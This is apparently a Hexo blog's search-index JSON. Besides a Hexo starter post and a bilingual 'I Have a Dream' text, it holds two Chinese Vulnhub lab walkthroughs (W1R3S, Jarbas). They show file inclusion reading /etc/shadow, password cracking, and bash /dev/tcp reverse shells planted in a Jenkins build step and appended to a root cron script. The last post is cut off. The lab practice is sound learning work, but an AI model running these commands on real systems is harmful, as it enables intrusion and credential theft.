[{"title":"Hello World","url":"/2022/10/25/readme/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":["Hexo"],"tags":["Hexo"]},{"title":"I Have a Dream","url":"/2023/08/04/First-Start/","content":"I Have a Dream\n我有一个梦想\n——Martin Luther King, Jr.\nI am happy to join with you today in what will go down in history as the  greatest demonstration for freedom in the history of our nation.\n今天我很高兴和大家一起，参加这次将成为我们国家历史上为了争取自由而举行的最伟大的游行示威集会。\nFive score years ago, a great American, in whose symbolic shadow we stand today, signed the Emancipation Proclamation.\n一百多年前，一位伟大的美国人，今天我们就站在他的象征性的身影之下，签署了解放宣言。\nThis momentous decree came as a great beacon light of hope to millions of  Negro slaves who had been seared in the flames of withering injustice.  It came as a joyous daybreak to end the long night of their captivity.  But one hundred years later, the Negro still is not free.\n这项重要法令的颁布，对于千百万煎熬于非正义残焰中的黑奴来说，就像带来希望之光的伟大灯塔。恰似结束慢慢长夜禁锢的欢畅黎明。\nBut one hundred years later, the Negro still is not free.\n但100年之后，黑奴并没有获得自由。\nOne hundred years later, the life of the Negro is still sadly crippled by  the manacles of segregation and the chains of discrimination.\n100年之后，黑奴的生活依然是悲惨的蹒跚于种族隔离和种族歧视的枷锁下。\nOne hundred years later, the Negro lives on a lonely island of poverty in the midst of a vast ocean of material prosperity.\n100年之后，黑奴依然生活在物质繁荣海洋中一个贫困孤岛之上。\nOne hundred years later, the Negro is still languished in the corners of  American society and finds himself an exile in his own land.\n100年之后，黑奴依然在美国社会间向隅而泣，依然感到自己在国土家园中颠沛流离。\nAnd wo we’ve come here today to dramatize a shameful  condition.\n所以今天我们来到这里，将这骇人听闻的现状公之于众。\nIn a sense we’ve come to our nation’s capital to cash a check.\n从某种意义上说，我们来到国家首都是为了兑现一张支票。\nWhen the architects of our republic wrote the magnificent words of the  Constitution and the Declaration of Independence, they were signing a  promissory note to which every American was to fall their.\n我们共和国的缔造者在家拟写宪法和独立宣言的辉煌篇章时，签署了一张每一个美国人都能继承的期票。\nThis notes was a promise that all men, yes, black men as well as white men,  would be guaranteed the “unalienable Rights” of “Life, Livberty and the  pursuit of Happiness.”\n这张期票向所有人承诺-不论黑人还是白人，都享有不可让渡的生存权、自由权和追求幸福权。\nIt is obvious today that America has defaulted on this promissory note, insofar as her citizens of color are concerned.\n然而，今天美国显然对她的有色公民拖欠着这张期票。\nInstead of honoring this sacred obligation, America has given the Negro people a bad check, a check which has come back marked “insufficient funds”.\n美国没有承兑这笔神圣的债务， 而是开始给黑人一张空头支票-一张被盖着“资金不足”的信戳被退回的支票。\nBut we refuse to believe that the band of justice is bankrupt.\n然而我们拒绝相信正义银行已经破产。\nWe refuse to believe that there are insufficient funds in the great vaults of opportunity of this nation.\n我们拒绝相信在这个国家庞大的机会宝库中会没有足够的资金。\nAnd so, we’ve come to cash this check, a check that will give us upon demand the riches of freedom and the security of justice.\n所以我们到这里来兑现这张支票，一张在需要时可以给我们带来自由之财富和公平之保障的支票。\nWe have also come to this hallowed spot to remind America of the fierce urgency of Now.\n我们今天来到这的神圣的地方，也是为了 提醒美国这个问题的紧迫性。\nThis is no time to engage in the luxury of cooling off or to take the tranquilizing drug of graduation.\n现在不是缓和情绪或服用渐进主义安定药的时候。\nNow is the time to make real the promisses of democracy.\n现在是做出真正的民主承诺的时候。\nNow is the time to rise from the dark and desolate valley of segregation to the sunlit path of racial justice.\n现在是走出种族隔离之黑暗荒芜，走向种族公平之阳光大道的时候。\nNow is the time to lift our nation from the  quicksands of racial injustice to the solid rock of brotherhood.\n现在是将我们国家从种族不公正的流沙中拔出，安置于兄弟般情谊的磐石之上的时候。\nNow is the time to make the justice a reality for all of God’s children.\n现在是给上帝的所有儿女公正待遇的时候。\nIt would be fatal for the nation to overlook the urgency of the movement.\n倘或我们国家忽视了这种紧迫性，其后果将是致命的。\nThis sweltering summer of the Negro’s legitimate discontent will not pass  until there is an invigorating antumn of freedom and equality.\n在令人振奋的自由与平等的秋天到来之前，这个由黑人的合理不满造成的酷热夏季将不会过去。\nNineteen sixty-three is not an end, but a beginning.\n1963年不是一个终结，而是一个开始。\nAnd those who hope that the Negro needed to blow off steam and will now be  content will have a rude awakening if the nation return to business as  usual.\n对于那些希望黑人只是发泄一下情绪，并且将会安于现状的人来说，如果整个国家将不改变态度的话，他们将会被粗暴地唤醒。\nAnd there will be neither rest nor tranquility in America until the Negro is granted his citizenship right.\n在黑人取得其公民权利之前，美国将永无安定祥和。\nThe whirlwinds of revolt will continue to shake the foundations of our nation until the bright day of justice emerges.\n反抗的旋风不断摇晃着我们国家的基础，知道出现公平的晴天。\nBut there is something that I must say to my people, who stand on the warm  threshold which leads into the palase of justice: in the process of  gaining our rightful place, we must be not guilty of wrongful deeds.\n但我必须提醒大家，我们今天站在通往公正的殿堂的道路上，这道门槛曾经被千千万万的人踏过，在取得我们应有地位的过程中，我们无论如何不能采取任何错误的行为。\nLet us not seek the satisfy our thirst for freedom by drinking from the cup of betterness and hatred.\n我们不能因为渴望自由，就去饮用愤怒和仇恨之酒。\nWe must forever conduct our struggle on the high plane of dignity and discripline.\n我们必须始终以高层次的品格和自律来进行我们的斗争。\nWe must forever not allow our creative protest to degenerate into physical violence.\n我们决不能让富有创意的示威活动堕落为暴力行为。\nAgain and again, we must rise to the majestic heights of meeting physical force with soul force.\n我们必须一次又一次地升华到以心灵力量对抗肉体力量的崇高境界。\nThe marvelous new militancy which has engulfed the Negro community must not lead us to a distrust of all white people, for many of our white  brothers, as evidenced by their presence here today, have come to  realize that their desnity is tied up with our destiny.\n目前充满黑人社区的新斗争精神是很好的，但绝不能造成我们对所有白人的不信任。因为我们许多白人兄弟，正如他们进入我们的行列这样，已经意识到我们的命运和他们的命运紧紧相连。\nAnd they have come to realize that their freedom is inextricably bound to our freedom.\n他们已经意识到他们的自由和我们的自由不可分割。\nWe cannot walk alone.\n我们不能独自前进。\nAnd as we walk, we must make the pledge that we should always march ahead. We cannot turn back.\n并且在我们的进程中，我们必须发誓我们将永远一起向前走，绝不能走回头路。\nThere are those who are asking the devotees of civil right, “When will you be satisfied?”\n有些责任民权运动的积极分子说：“你们什么时候才能满足？”\nWe will never be satisfied as long as the Negro is the victim of the unspeakable honnors of police brutality.\n只要黑人还受害于警察兽行之难以言述的恐怖，我们就绝不会满意。\nWe can never be satisfied as long as our bodies, heavy with the fatigue of travel, cannot gain lodging in the motels of the highways and the  hotels of the cities.\n只要我们经过长途跋涉而疲惫不堪的身体，无法在公路边的汽车旅店和城市中的旅馆内得到休息，我们就绝不会满意。\nWe can never be satisfied as long as the Negro’s basic mobility is from a small ghetto to a larger one.\n只要黑人的基本迁徙，只是从一个较小的黑人区搬到一个较大的黑人区，我们就绝不会满意。\nWe can never be satisfied as long as our children are tripped of their  selfhood and robbed of their dignity by signs stating “For White Only”.\n只要我们的孩子，因为“只限白人”的标志而被剥夺自我，伤及自尊，我们就绝不会满意。\nwe cannot be satisfied as long as a Negro in Mississippi cannot vote and a Negro in New York believes he has nothing for which to vote.\n只要密西西比州的黑人还不能投票，我们就绝不会满意。\nNo, no, we are not satisfied, and we will not be satisfied until “justice  rolls down like waters, and righteousness like a mighty steam.”\n不会，绝对不会，我们决不会满意，直到“公平像水一样流淌，正义行为如同滚滚洪流”，我们就绝不会满意。\nI am not unmindful that some of you have come here out of great trials and tribulations.\n我知道你们中一些人来到这里，是因为你们所受的巨大苦痛和压迫。\nSome of you have come fresh from narrow jail cells.\n一些人刚从狭窄的牢房里出来。\nAnd some of you have come from areas where you quest – quest for freedom  left you battered by the storms of persecution and staggered by the  winds of police brutality.\n还有一些人因为追求自由而受到种种迫害，以及警察兽性的打击。\nYou have been the veterans of creative suffering.\n你们受尽了种种痛苦。\nContinue to work with the faith that unearned suffering is redemptive.\n但请继续努力。坚信承受不应有的痛苦是会有回报的。\nGo back to Mississippi, go back to Alabama, go back to South Carolina, go  back to Georgia, go back to Louisiana, go back to the slums and ghettos  of our northern cities, knowing that somehow this situation can and will be changed.\n回到你们家乡去，回到北方城市的贫民窟和黑人区去，坚信这种情况早晚都是要变的。\nLet us not wallow in the valley of despair, I say to you today, my friends.\n让我们再不要在绝望的深谷里徘徊。朋友们，这就是我要向大家说的。\nAnd so even though we face the difficulty of today and tomorrow, I still have a dream.\n尽管现在我们会遇到很多困难，但我仍然有一个梦想。\nIt’s a dream that deeply rooted in the American dream.\n这都是一个发源于美国梦的梦想。\nI have a dream that one day this nation will rise up and live out the  true meaning of its creed: “I hold these truths to be self-evident, that all man are created equal.”\n我梦想有一天， 这个国家终将站出来履行其信条”我们认为人生而平等是一个真理。“\nI have a dream that one day on the red hills of Georgia, the sons of the  former slaves and the sons of the former slave owners will be able to  sit down together at the table of brotherhood.\n我梦想有一天，在乔治亚州的丘陵之上，奴隶的孩子和奴隶主的孩子能像兄弟般相处。\nI have a dream that one day even the state of Mississippi, a state  sweltering with the heat of unjustice, swletering with the heat of  oppresstion, will be transformed into oasis of freedom and justice.\n我梦想有一天在密西西比，这个充满不公平和压迫的地方，将会变成自由与公正的绿洲。\nI have a dream that my four little children will one day live in a nation that they will not be judged by the color of their skin but by the  content of their character.\n我梦想有一天我的孩子能生活在这样一个国度：这里的人们不是用皮肤颜色来衡量他们，而是根据他们的品行。\nI have a dream today.\n今天我有一个梦想。\nI have a dream that one day, down in Alabama, with its vicious racists,  with its governor having his lips dripping with the words of  “interposition” and “nullification” – one day right there in Alabama  little black boys and black girls will be able to join hands with little white boys and white girls as sisters and brothers.\n我梦想有一天在阿拉巴马，尽管这是一个有许多恶毒的种族主义者，尽管州长叫嚷着要与联邦政府对抗的地方，我希望有一天在这里，黑人孩子和白人孩子将会像兄弟间亲密无间。\nI have a dream today.\n今天我有一个梦想。\nI have a dream that one day every valley shall be exalted, and every hill and mountain shall be made low, the rough places will be made plain,  and the crooked places will be made straight; “and the glory of Lord  shall be revealed and all fresh shall see it together.”\n我梦想有一天，所有的深谷将会被填平，所有大山都被挖低，崎岖之地变成平原，扭曲的世界被修直，”主的光辉将被全人类共同瞻仰“。\nThis is our hope, and this is the faith that I go back to the South with.\n这就是我们的希望，这也是我们将带回南部的信仰。\nWith this faith, we will be able to hew out of the mountain of despair a stone of hope.\n有了这个信仰，我们就能移走绝望的大山，搬走压制希望的巨石。\nWith this faith, we will be able to transform the jangling discords of our nation into a beautiful symphony of brotherhood.\n有了这个信仰，我们就能将刺耳的不和谐音符转变成展示兄弟情义的美妙交响乐。\nWith this faith, we will be able to work together,to pray together, to  struggle together, to go to jail together, to stand up for the free  together, knowing that we will be free one day.\n我了这个信仰，我们就能一起工作，一起祈祷，一起奋斗，一起进监狱，一起维护自由，坚信有一天我们也会变得自由。\nAnd this will be the day – this will be the day when all of God’s children will be able to sing with the new meaning:\n并且这将是上帝的所有儿女能够以全新意义共同歌唱的一天。\n“My country ‘tis of thee, sweet land of liberty, of thee i sing. Land where my fathers died, land of the Pilgrim’s pride. From every mountainside,  let freedom ring.”\n“我的祖国是一片自由的土地。，我的父辈为了这片土地而牺牲，清教徒为这片土地而自豪。从每一个山脚，让自由之声想起。”\nAnd if America is to be a great nation, this must become true.\n如果美国要成为一个自由的国度，这一条必须实现。\nSo let the freedom ring from the prodigious hilltops of New Hampshire.\n所以让自由之声在新罕布州的大山顶上响起。\nLet the freedom ring from the mighty mountains of New York.\n让自由之声在纽约的巨峰上响起。\nLet the freedom ring from the heightening Alleghenies of Pennsylvania.\n让自由之声在宾夕法尼亚州高耸入云的阿勒格尼山上响起。\nLet the freedom ring from the snow-capped Rockies of Colorado.\n让自由之声在科罗拉多州白雪皑皑的洛杉矶上响起。\nLet the freedom ring from the curvaceous slopesof California.\n让自由之声在加利福尼亚州崎岖不平的土地上响起。\nBut not only that:\n不仅如此，\nLet the freedom ring from Stone Mountain of Georgia.\n让自由之声在乔治亚州的石头山上响起。\nLet the freedom ring from Lookout Mountain of Tennessee.\n让自由之声在田纳西州的瞭望山上响起。\nLet the freedom ring from every hill and molehill of Mississippi.\n让自由之声在密西西比州的每一座山上响起。\nFrom every mountainside, let freedom ring.\n从每一个山脚，自由之声响起。\nAnd when this happens, when we allow freedom ring, when we let it ring from every village and hamlet, from every state and every city, we will be  able to speed up that day when all of God’s children, black men and  white men, Jews and Gentiles, Protestants and Catholics, will be able to  join hands and sing in the words of the old Negro spiritual:\n当这一天来临，当我们可以让自由之声回响，当我们让他在每一座村庄，每一个城市回响时我们离这样的日子就不远了：到那时，上帝的所有儿女们，黑人白人，犹太人异教徒新教徒和天主教徒，将可以手牵手站在一起，同声歌唱古老的黑人圣歌。\nFree at last, free at last! Thank God Almighty, we are free at last.\n终于自由了，终于自由了，感谢万能的上帝，我们终于自由了。\n","tags":["Speech"]},{"title":"W1r3s靶场练习","url":"/2023/11/07/w1r3s/","content":"自我沉淀，跟随红队笔记的视频讲解，进行W1r3s靶场的学习以及实验笔记，Section one！\n\n\nW1R3S 1.0.11.Nmap扫描sudo nmap -sn 192.168.72.0/24\t#扫描主机// -sn 采用的是Ping扫描，正常情况发送4种报文。// 1.icmp回显请求；端口443的TCP-SYN请求；3.端口80的TCP-ACK请求；icmp时间戳请求。// 不使用sudo，则只会使用connect调用发送SYN请求到80,443端口；使用sudo后扫描本地网络是使用ARP请求，类似与arp-sacn -l。\n\n\n可以判断154为靶机IP地址\nsudo nmap -sT --min-rate 10000 -p- 192.168.72.154 -oA /opt/nmapscan/ports// -sT 使用TCP建立完全连接扫描// -p- 表示扫描所有的端口，不是扫描默认的常见端口// --min-rate 设置最小扫描速率// -oA 将扫描结果保存到文本中，会生成3个文件，.nmap；.gnmap；.xml。\n\n\n扫描出来4个开放的端口和服务类型，还需进一步确认\nsudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.72.154 -oA /opt/nmapscan/detail// -sV 对端口上的服务程序版本进行扫描// -sC 使用脚本进行扫描，耗时长// -O 对目标主机的操作系统进行扫描\n\n\n扫描结果表示：\n21端口是ftp服务，版本为vsftpd 2.0.8或更新版本，可以实现Anonymous匿名登录；\n22端口是ssh服务，应用是OpenSSH 7.2p2 ，还有一些Ubuntu的系统信息，列出了ssh的主机密钥；\n80端口是Apache服务，2.4.18的版本并提示可能是Ubuntu系统；\n3306端口是MySQL服务，MAC地址为VMware中；\n操作系统为Linux，版本给出了一定范围。\nsudo nmap -sU --top-ports 20 192.168.7.154 -oA /opt/nmapscan/w1r3s/udp// 进行UDP扫描，扫描20常见个端口，必要时使用\n\n\nsudo nmap --script=vuln -p21,80,22,3306 192.168.72.154 -oA /opt/nmapscan/w1r3s/vuln// 漏洞扫描\n\n\n结果可以看出21，22端口没有太多的信息，80端口有一个DOS的漏洞可以利用，但基本不会选择使用DOS攻击\n还发现了有一个 &#x2F;wordpress&#x2F;wp-login.php的登录页面\n\n2.渗透阶段21端口先看21端口的ftp服务，尝试ftp匿名登录\nftp 192.168.72.154// 输入anonymous，密码为空（ftp匿名登录都是这个用户名和密码）// 进入ftp中，首先想到的是用binary切换到二进制模式，保证下载的文件不出错\n\n\n下载文件到本地\nprompt// 使用prompt命令关闭交互模式，下载文件就不需要每次都选Y/N了// mget *.txt 批量下载后缀为txt的文件// get 下载单个文件\n\n\n下载完成后本地查看各个文件\n\n\n查找可用信息；\n第一行介绍了ftp服务器是W1R3S公司（inc表示incorporated注册公司）；\n下面有一串字符，目测是Hash，使用hash-identifier工具检测为MD5；\n\n解密MD5，可以使用Kali自带工具john或网站（cmd5找到了要付费，所以在外网找了另一个网站）；\n\n明文为：This is not a password（告诉我们不是密码，听我说谢谢你）；\n反向校验一下：\necho -n &#x27;This is not a password&#x27; | md5sum\n\n\n验证确实是正确的；\n下一个字符串为常见的Base64编码，使用解码工具解码或者Kali破解\n\necho -n &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27; | base64 -d\n\n\n明文：It is easy, but not that easy..（又是提示）；\n再往下是公司的ASCII艺术字体，网上可以搜网站生成（挺好玩的）；\n再是员工的信息，可能会用到；\n最后是一行倒着的字符，正常查看为：\n\n\n提示告诉我们这不是正确的方法，至此结束21端口的渗透。\n3306端口尝试以root用户登录MySQL，尝试空密码\n\n显示无法连接MySQL，尝试不成功，暂时放弃3306端口。\n80端口访问服务器80端口，是Apache的默认页面\n\n查看源码和阅读默认页面内容无法发现有用的信息。\n尝试目录爆破，使用Kali的gobuster工具（下载命令 sudo apt install gobuster)\nsudo gobuster dir -u http://192.168.72.154 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt// 使用gobuster的自带字典\n\n\n找到3个页面，尝试访问\n&#x2F;wordpress\n\n自动跳转到了localhost，和之前的 &#x2F;wordpress&#x2F;wp-login.php页面情况相同，尝试修改本地hosts文件，访问也无效，暂时放弃；\n&#x2F;javascript\n\n同样无法访问，暂时放弃；\n&#x2F;administrator\n\n发现是一个Cuppa CMS的安装界面，核对信息，点击next下一步（真实情况下此动作需要仔细斟酌，可能会覆盖原有的设置，造成无法挽救的结果！！！）\n\n来到了CMS的配置界面，尝试配置（发现database拼写错误了，可能是一个特征，需要重视，但这里不再考虑）后直接执行下一步；\n\n同上一步操作，依旧是需要考虑带来的负面影响，但此处是靶场，便不考虑现实因素；\n\n显示安装成功但是管理员用户创建失败，尝试几次后依旧如此，暂时放弃。\n尝试寻找Cuppa CMS的漏洞，使用Kali的searchsploit工具查找漏洞\nsearchsploit cuppa cms \n\n\n找到一个文件包含漏洞，下载漏洞利用文本\nsearchsploit cuppa cms -m 25971\n\n\n查看漏洞信息\n\n说明是在 **&#x2F;alerts&#x2F;alertConfigField.php **文件中产生了文件包含漏洞，原因是源代码22行处存在&lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt; 的代码\n再往下看\n\n描述中可以包含shell文件和包含本地重要文件\n尝试包含 &#x2F;etc&#x2F;passwd 文件\nhttp://192.168.72.154/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\n\n\n路径不存在，尝试其他的路径\nhttp://192.168.72.154/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\n\n\n发现路径存在也读取到了文件但是没有将文件内容读取出来\n这里用到的是GET方式传递参数，漏洞利用文档里存在Base64编码问题，不由得想到换个思路，尝试利用POST传参读取文件\n\n果然，成功读取到了passwd的文件内容；\n由于是公开的CMS，可以尝试将源码下载下来进行代码审计；\n\n结合源代码验证了确实是使用的POST方法传递的参数。\n使用 curl 进行url编码并使用POST传参查看\n\ncurl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/passwd&#x27; http://192.168.72.154/administrator/alerts/alertConfigField.php\n\n\n同样成功读取数据，注意带passwd文件第二列为 x ，说明用户密码以Hash的方式存放在了 &#x2F;etc&#x2F;shadow 文件中；\n下一步读取 &#x2F;etc&#x2F;shadow \ncurl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/shadow&#x27; http://192.168.72.154/administrator/alerts/alertConfigField.php\n\n\n读取到3个用户密码的Hash值，下一步就是进行Hash的解密了；\n将密码保存到本地文件，使用john进行破解；\n\njohn shadow.hash\n\n\n成功跑出www-data 和w1r3s用户的密码（一般不使用www-data）\n尝试ssh登录w1r3s用户\nsudo ssh w1r3s@192.168.72.154\n\n\n成功登录\n查看用户信息并尝试提权\n\n发现该用户具有所有命令的执行权限\nsudo /bin/bash// 以管理员打开bash命令行\n\n\n成功获得root权限，寻找flag\n\nCongratulation！！！\n22端口22端口可以利用工具进行密码爆破，就不进行演示了（遵循原则，不到穷途末路，不爆破）\n工具方面可以使用 hydra\n3.总结\n主机发现，nmap扫描发现靶机\n端口扫描，发现开放了21，22，80，3306四个端口。并针对这四个端口进行漏洞扫描，发现有名为wordpress的cms\n综合考虑决定先从21端口FTP开始入手，进行匿名登录，查看里面的信息，发现了许多.txt文件，包括了一些提示信息和人员名单。虽然这些信息最后貌似没有用上，但我们打靶的时候还是要把这些信息记录下来，毕竟在当时我们不知道这些信息是否有利用价值。\nweb渗透，查看web页面，发现apache默认界面，扫描目录发现有wordpress,adminstrator,javascript，逐一访问，发现adminstrator子目录的cms为cuppa，用kali中的searchsploit进行利用，发现文件包含漏洞，&#x2F;etc&#x2F;shadow暴露了登录密码。\n使用join破解密码hash，得到登录账号w1r3s的密码为conputer，尝试对22端口进行ssh登录，成功登录，查看权限，发现已经是系统权限了。\n提权，以系统权限运行bash，成功升级为root。\n\n","tags":["Vulnhub"]},{"title":"jarbas","url":"/2023/11/16/jarbas/","content":"自我沉淀，跟随红队笔记的视频讲解，进行Jarbas靶场的学习以及实验笔记，Right on！\n\n\nJarbas1.Nmap扫描进行主机发现，用 -sn 参数（ping 扫描）扫描同网段的存活主机。实际渗透测试建议在靶机未上线时先扫描一次，靶机上线之后再扫描一次，这样对比观察就能确定靶机的IP。\nnmap -sn 192.168.72.0/24\n\n\n成功发现了靶机的IP为192.168.72.156。\n端口扫描，选择TCP扫描，以每秒10000的最小速率（–min-rate 10000）扫描全部端口(-p-)，其中10000是扫描准度和速度的权衡结果。\nnmap -sT -min-rate 10000 -p- 192.168.72.156 -oA /opt/nmapscan/jarbas/ports\n\n\n扫描结果显示4个端口存活：22，80，3306，8080；\n进一步扫描具体用TCP扫描（-sT），脚本扫描（-sC)，查看其服务版本（-sV）和操作系统（-O）：\nnmap -sT -sC -sV -O -p22,80,3306,8080 192.168.72.156 -oA /opt/nmapscan/jarbas/details\n\n\n根据扫描结果：\n22端口为SSH服务，OpenSSH 7.4版本；\n80端口为Apache，由CentOS和PHP搭建；\n3306为MySQL，可能是MariaDB；\n8080端口为http，服务版本是Jetty 9.4.z-SNAPSHOT（不太熟悉）；\n再进行一次UDP的扫描：\nnmap -sU -p22,80,3306,8080 192.168.72.156\n\n\n扫描结果显示UDP端口全为关闭状态；\n试试脚本扫描：\nnmap --script=vuln -p 22,80,3306,8080 192.168.72.156 -oA /opt/nmapscan/jarbas/vuln\n\n\n漏洞扫描也没太多发现，就发现8080端口有一个 robots.txt 的文件，一会可以看一下。\n下面我们要开始渗透了，至于从哪里入手，分析如下：\n一共开放了四个端口，22远程登录，3306数据库MySQL，还有两个web端口80和8080。显然这个靶机的入口应该还是web。SSH没有太多的攻击面。因此接下来，我们先进行web渗透。\n\n\n\n2.Web渗透浏览器访问页面192.168.72.156，可以看到一个Jarbas的页面，这就是80端口的页面\n\n8080也是Web端口，我们同样用浏览器访问192.168.72.156:8080 ，发现是一个登录界面：同时暴露了cms是Jenkins。\n\n如果能够登录进这个界面，应该就可以看到更多有关网站管理后台的信息。因此我们的首要思路就是如何找到这个登录界面的账号和密码，寻找用户名和密码有如下几个思路：\n\n尝试默认登录，Jenkins是常见cms，可能存在默认密码；\n尝试弱口令爆破；\n尝试渗透寻找相关密码。\n\n我们还是先找找有没有一些信息泄露的位置，可能暴露这里的登录用户名和密码。其次在网上搜索有没有Jenkins这类cms的默认登录密码，爆破是迫不得已的方法。\n这里插叙一下，在进行nmap漏洞扫描的时候，我们发现了8080端口又robots.txt，因此访问192.168.200.140:8080&#x2F;robots.txt试一试：\n\nrobots.txt界面有一句话，我们不想让机器人点击“build”链接，此时我们并不了解含义，大致猜测应该是网站不希望一些自动化工具点击build。下面我们再进行一下目录爆破80端口，看看有没有什么其他可以提供信息的web页面。先用dirb试试：\ndirb http://192.168.72.156\n\n\n非常遗憾，啥也没看出来，不应该呀。通常web后台我们关注的是.php和.html页面，那么我们再指定参数 –x .php,.html试一试：\ndirb http://192.168.72.156 –X .php,.html\n\n\n结果还不错，扫出来一个access.html页面，当然还有一个index.html页面。我们尝试访问192.168.72.156&#x2F;access.html：\n\n关键信息原来在这儿呢！首先access的意思就有访问、到达的含义，这个页面还给出了一些关键信息，首先是图片上方的标题，直译结果为：凭据以安全的方式进行了加密！\n这里的creds凭据应该就是指密码，下面有三行信息，貌似是用户名和密码，密码经过加密，貌似是md5的形式，那么我们用hash-identifier确认一下加密方式，把第一行的数据5978a63b4654c73c60fa24f836386d87检测一下。\n\n好了，下一步就是用md5破解工具，这里找了个在线md5破解网站，把三行md5加密后的内容复制进去。\ntiago--5978a63b4654c73c60fa24f836386d87--italia99trindade--f463f63616cb3f1e81ce46b39f882fd5--mariannaeder--9b38e2b1e8b12f426b0d208a7ab6cb98--vipsu\n\n成功搞到了三个密码，接下来使用这三个密码对8080端口的登录进行尝试。\n用户名eder密码vipsu可以成功登录，登录进来的页面如下：\n\n3.漏洞利用在第二步中，我们已经成功登录了8080端口的页面，进来之后发现是一个cms的后台管理页面，这个后台是Jenkins，下面我们就是需要寻找这个cms有哪些漏洞。我们可以先去kali中的searchsploit搜索一下，或者去msf看看有没有Jenkins的相关漏洞。\n\n我这里一搜发现一大堆，整的我有选择恐惧症了。红队笔记大佬说他对Jenkins这个cms非常熟悉，因此漏洞触发的点也非常清楚。\n进入登录进来的页面有一个创建新项目的选项，那我们干脆创建一个项目，并观察创建过程的配置选项，看看是否存在可能出现漏洞的位置。点击create new job，随便给项目起个名字，我们这里就叫Hacking吧，项目类型就选第一个freestyle project，点击ok。至于为啥选freestyle project，只能说这个排在第一个，应该是最常用的选项，最有可能具有更多的功能点，也就有可能有更多的攻击面。\n\n 点击ok之后，进入了下图的配置界面。\n\n这个配置界面的选项有很多，我们的目标是寻找漏洞。发现有个build模块，想起了之前robots.txt的提示，可能就是说不希望自动化工具在这里build。因此我们看一下Build模块，点击add build step，下拉箭头有很多，第一个是执行windows批处理命令，之前nmap扫描的时候已经发现靶机是linux，因此这个选项不在我们考虑的范围。第二个命令是excute shell执行shell，这就很有趣了，这里可以执行shell吗？那我们是不是可以在这里构造反弹shell的命令，然后build执行？\n我们选择excute shell，出现了command输入界面，我们就输入反弹shell的命令，点击save用kali的4444端口接收反弹shell好了。\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.72.150/4444 0&gt;&amp;1# 命令中的ip为kali的ip和kali监听的端口，即接收反弹shell的ip和端口\n\n\n点击save之后，项目新建成功。\n在启动这个项目之前（build now按钮点击之前)，我们先要在kali上开启4444端口进行监听。\nnc –lvnp 4444\n\n\n 然后在刚才的Jenkins管理界面点击build now； 点击之后，管理界面如下图，项目应该是成功建立并启动了：\n\n回到刚才进行监听4444端口的kali终端，成功获得了初始立足点，获得了一个反弹shell：\n\n我们就看看这个shell的相关信息：\nwhoamiuname –asudo -l\n\n\n 发现这个shell的用户叫做jenkins，和cms同名，同时权限很低，我们试试能不能看到&#x2F;etc&#x2F;passwd中所有的账户信息：\ncat /etc/passwd\n\n\n 这里有两个用户是有bash的，即root和eder。而我们正在登录的jenkins的bash还并不完全，为&#x2F;bin&#x2F;false。我们再试试能不能查看&#x2F;etc&#x2F;shadow\ncat /etc/shadow\n\n\n很遗憾，没权限。那么我们就无法通过&#x2F;etc&#x2F;passwd破解登录的账户和密码了。此时我们已经获得了初始立足点jenkins，接下来的关键就是找到提权的方法获取root权限。\n4.权限提升提权的基本思路就是：以低权限修改可执行文件&#x2F;脚本，却以高权限运行可执行文件&#x2F;脚本。因此我们的思路就是寻找以高权限运行的脚本，企图修改脚本，在其中添加我们的“恶意指令”，最终实现提权。最终发现了以root权限运行的定时任务。\ncat /etc/crontab\n\n\n发现了一个每五分钟定期执行的sh脚本CleaningScript.sh，我们看一看他是啥：\n\n是一个定期删除日志的脚本。那么我们试试能不能追加一行，让在定时任务中加入命令，使得反弹shell到kali,注意在追加这个命令之前，先要另起一个终端，监听4443端口用于接收root的反弹shell。监听哪个端口无所谓，但不要选择之前接收jenkins的4444端口，避免冲突混乱。\necho &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.72.150/4442 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh# 追加反弹shell命令\n\n\n最多等待5min后（因为定时任务是每5min执行一次），在监听4442端口的终端应该会接收到靶机root权限的shell，果然，成功提权：\n\nflag就在当前目录下（做的时候搞忘记截图了，还要再等5分钟，遂无图）。\n5.总结打靶完成后，再进行一下总结。这个打靶的全过程思路如下：\n\n主机发现，nmap扫描发现靶机是192.168.200.140\n\n端口扫描，发现开放了22，80，3306，8080四个端口。并针对这四个端口进行漏洞扫描，发现8080端口有一个robots.txt的文件\n\n目录扫描，从web界面入手，发现jarbas的界面和8080端口的登录界面。对网站进行目录扫描后发现access.html文档，经过解密，成功得到了用户名和密码，登录进入了名为Jenkins的cms后台。\n\n查看端口扫描出的robots.txt文件，发现有关于build的提示，在Jenkins的解密寻找漏洞和可能build的位置，成功发现了execute shell的位置，输入反弹shell到kali的指令，点击build 